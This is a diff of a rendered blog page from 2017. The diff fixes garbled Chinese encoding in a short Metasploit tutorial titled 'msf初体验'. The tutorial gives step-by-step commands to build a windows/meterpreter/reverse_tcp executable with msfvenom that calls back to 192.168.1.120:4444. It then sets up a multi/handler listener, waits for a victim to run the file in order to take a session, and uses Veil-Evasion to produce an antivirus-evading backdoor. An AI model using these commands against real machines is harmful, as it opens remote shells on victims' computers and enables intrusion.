@@ -7,7 +7,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>msf������ | sun1024</title>
+  <title>msf初体验 | sun1024</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -15,34 +15,43 @@
     <meta name="keywords" content="metasploit," />
   
 
-  <meta name="description" content="#msf����ʹ�ã�(��windows/meterpreter/reverse_tcpΪ��)
-##1.payload���ã�
+  <meta name="description" content="#msf简单使用：(以windows/meterpreter/reverse_tcp为例)
+##1.payload设置：
 
-�¿��ն�
+新开终端
 
 msfvenom -l
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/����/1.exe //����exe">
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件
+##2.监听：
+
+进">
 <meta property="og:type" content="article">
-<meta property="og:title" content="msf������">
+<meta property="og:title" content="msf初体验">
 <meta property="og:url" content="http://yoursite.com/2017/02/06/msf初体验/index.html">
 <meta property="og:site_name" content="sun1024">
-<meta property="og:description" content="#msf����ʹ�ã�(��windows/meterpreter/reverse_tcpΪ��)
-##1.payload���ã�
+<meta property="og:description" content="#msf简单使用：(以windows/meterpreter/reverse_tcp为例)
+##1.payload设置：
 
-�¿��ն�
+新开终端
 
 msfvenom -l
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/����/1.exe //����exe">
-<meta property="og:updated_time" content="2017-02-06T13:43:44.217Z">
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件
+##2.监听：
+
+进">
+<meta property="og:updated_time" content="2017-02-06T13:48:11.443Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="msf������">
-<meta name="twitter:description" content="#msf����ʹ�ã�(��windows/meterpreter/reverse_tcpΪ��)
-##1.payload���ã�
+<meta name="twitter:title" content="msf初体验">
+<meta name="twitter:description" content="#msf简单使用：(以windows/meterpreter/reverse_tcp为例)
+##1.payload设置：
 
-�¿��ն�
+新开终端
 
 msfvenom -l
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/����/1.exe //����exe">
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件
+##2.监听：
+
+进">
 
   
 
@@ -187,7 +196,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f ex
 <div class="content content-post CENTER">
    <article id="post-msf初体验" class="article article-type-post" itemprop="blogPost">
   <header class="article-header">
-    <h1 class="post-title">msf������</h1>
+    <h1 class="post-title">msf初体验</h1>
 
     <div class="article-meta">
       <span>
@@ -222,46 +231,46 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f ex
 
   <div class="article-content">
     
-      <p>#msf����ʹ�ã�(��windows/meterpreter/reverse_tcpΪ��)</p>
-<p>##1.payload���ã�</p>
+      <p>#msf简单使用：(以windows/meterpreter/reverse_tcp为例)</p>
+<p>##1.payload设置：</p>
 <ul>
-<li>�¿��ն�</li>
+<li>新开终端</li>
 </ul>
 <p><code>msfvenom -l</code></p>
-<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/����/1.exe //����exe�ļ�</code></p>
-<p>##2.������</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件</code></p>
+<p>##2.监听：</p>
 <ul>
-<li>����metasploit</li>
+<li>进入metasploit</li>
 </ul>
 <p><code>use exploit/multi/handler</code></p>
 <p><code>show options</code></p>
-<p>##3.���빥������</p>
+<p>##3.插入攻击荷载</p>
 <ul>
 <li>show payloads</li>
 </ul>
 <p><code>set payload windows/meterpreter_reverse_tcp</code></p>
 <ul>
-<li>�ٴ�show options(����LHOST��LPORTѡ��)</li>
+<li>再次show options(出现LHOST和LPORT选项)</li>
 </ul>
 <p><code>set lhost 192.168.1.120</code></p>
 <p><code>set lport 4444</code></p>
-<p>##4.ʹ��run ���� exploit ��������</p>
+<p>##4.使用run 或者 exploit 启动攻击</p>
 <ul>
-<li><p>�ȴ��������������У������õ�session</p>
+<li><p>等待被攻击主机中招，即可拿到session</p>
 </li>
-<li><p>ʹ��jobsֹͣ����</p>
+<li><p>使用jobs停止攻击</p>
 </li>
 </ul>
-<p><code>sessions -l  //��ȡsession�б�</code></p>
-<p><code>sessions -i 1 //����meterpreter</code></p>
+<p><code>sessions -l  //获取session列表</code></p>
+<p><code>sessions -i 1 //进入meterpreter</code></p>
 <p>==============================</p>
 <p>#PS:</p>
-<p>ʹ��veil-veasion���ɺ��ţ�<br>�����ն�</p>
+<p>使用veil-veasion生成后门：<br>打开终端</p>
 <p><code>veil-veasion</code></p>
 <p><code>list</code></p>
-<p><code>use 6 //��cΪ��</code></p>
-<p>���ɵĺ�̨��ַ��<br><code>/var/lib/veil-evasion/output/compiled/payload.exe</code></p>
-<p>��msf��ʹ�ã�</p>
+<p><code>use 6 //以c为例</code></p>
+<p>生成的后台地址：<br><code>/var/lib/veil-evasion/output/compiled/payload.exe</code></p>
+<p>在msf中使用：</p>
 <p><code>msfconsole -r /var/lib/veil-evasion/output/handlers/payload_handler.rc</code></p>
 
     
